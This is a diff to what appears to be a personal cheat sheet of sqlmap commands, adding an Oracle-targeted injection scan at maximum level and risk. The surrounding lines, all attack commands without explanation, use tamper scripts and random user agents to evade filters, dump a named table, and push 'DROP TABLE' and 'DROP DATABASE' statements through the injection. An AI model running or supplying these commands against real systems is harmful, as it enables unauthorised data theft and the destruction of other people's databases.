@@ -13,6 +13,7 @@
 11. python sqlmap.py -r request4.txt -t 10 --tamper="between,randomcase,space2comment" --random-agent -D tes3 -T coba --dump
 12. python sqlmap.py -r request4.txt -t 10 --tamper="between,randomcase,space2comment" --random-agent --sql-query "DROP TABLE nama_tabel"
 13. python sqlmap.py -r request4.txt -t 10 --tamper="between,randomcase,space2comment" --random-agent --sql-query "DROP DATABASE nama_database"
+14. python3 sqlmap.py -r request.txt -t 10 --tamper="between,randomcase,space2comment" --random-agent --dbs --level=5 --risk=3 --threads=5 --hex --data="id=2618 AND 2323=2323" --dbms=Oracle
 
 // others
 python sqlmap.py -u "https://target.com/?id=1" -t 10 --tamper="between,randomcase,space2comment" --dbs --random-agent --risk=3 --level=5
